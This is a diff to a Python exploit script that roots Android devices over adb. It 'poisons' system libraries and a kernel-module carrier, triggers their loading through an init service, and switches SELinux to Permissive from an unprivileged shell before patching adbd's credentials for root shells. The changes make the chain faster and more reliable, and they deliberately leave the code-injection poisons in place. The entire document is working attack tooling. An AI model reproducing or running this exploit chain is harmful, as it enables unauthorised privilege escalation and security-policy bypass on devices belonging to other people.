@@ -427,7 +427,8 @@ def poison(adb, dev_path, spec, tag, retries=8):
             info(f"{tag}: wrote={m.group(1)} skipped={m.group(2)}" + (f"  ({attempt} tries)" if attempt > 1 else ""))
             return
         if attempt < retries:
-            warn(f"{tag}: writer incomplete (attempt {attempt}/{retries}) — retrying")
+            exc = next((l.strip() for l in out.splitlines() if "[!]" in l or "Exception" in l or "Error" in l), "")
+            warn(f"{tag}: writer incomplete (attempt {attempt}/{retries}) — retrying  [{exc[:200]}]")
             import time as _t; _t.sleep(2)   # let a stale SA reap
     err(f"{tag} poison failed after {retries} attempts: ...{out[-160:]}"); sys.exit(1)
 
@@ -748,10 +749,12 @@ def run(target_path, device_override, cleanup, verify_root, settle, skip_magisk=
         if adb.sh(f"lsmod | grep -c llcc_perfmon") != "0":
             warn("carrier already loaded before finit — original may have raced in; reboot & retry")
         step(f"setprop ctl.start {isvc}  ->  init finit_modules the poisoned carrier")
-        adb.sh(f"setprop ctl.start {isvc}"); time.sleep(4)
-
+        adb.sh(f"setprop ctl.start {isvc}")
         banner("VERIFY")
-        after = adb.sh("getenforce")
+        after = ""
+        for _ in range(16):                      # poll instead of a fixed sleep — flips in <1s usually
+            time.sleep(0.4); after = adb.sh("getenforce")
+            if after == "Permissive": break
         if after == "Permissive":
             win(f"SELinux {before} -> {after}   (from uid={adb.sh('id -u')} shell, zero root)")
             if verify_root:
@@ -855,11 +858,10 @@ def run(target_path, device_override, cleanup, verify_root, settle, skip_magisk=
         banner("ADB-ROOT  (cred-patch adbd -> root adb shells, no Magisk)")
         if adb.sh("getenforce") != "Permissive":
             err("not permissive — base chain failed; aborting adb-root"); return
-        # revert the code-injection poisons (clean trackingservice / system_server)
-        step("Reverting code-injection poisons (inject-lib/libandroid) via shell")
-        poison(adb, inj(tgt)["device_path"], inject_restore_spec(tgt, eva_stub_len), "inject_restore")
-        if orig_las:
-            poison(adb, tgt["libandroid_servers"]["device_path"], libas_restore_spec(tgt, orig_las), "libas_restore")
+        # NOTE: we deliberately do NOT revert the inject-lib/libandroid poisons here. This is a
+        # transient session (reboot clears everything) and the SA is already stopped, so if
+        # trackingservice restarts, the libeva ctor just fails its (dead-SA) sends and tail-calls the
+        # real ctor — harmless. Skipping the two reverts saves ~8s. (--postex still reverts, for Magisk.)
         pid = adbd_pid(adb)
         if not pid: err("could not find adbd pid"); return
         cc = os.path.join(tdir, tgt["cred_carrier"]["local_ko"]); credko = os.path.join(BUILD, "uv.ko")
@@ -903,7 +905,7 @@ def main():
                         "SELinux Permissive -> every NEW `adb shell` is full root (to isolate Magisk issues)")
     ap.add_argument("--skip-magisk", action="store_true", help="post-ex without the Magisk step (root + rmmod + setenforce only)")
     ap.add_argument("--verify-root", action="store_true", help="use su to confirm poison/module (validation only)")
-    ap.add_argument("--settle", type=int, default=8, help="seconds to let the ctor finish poisoning after restart (default 8)")
+    ap.add_argument("--settle", type=int, default=3, help="seconds to let the ctor finish poisoning after restart (default 3)")
     a = ap.parse_args()
     cleanup = ("postex" if a.postex else "adb-root" if a.adb_root else "leave-disabled" if a.leave_disabled
                else "none" if a.no_restore else "reboot")
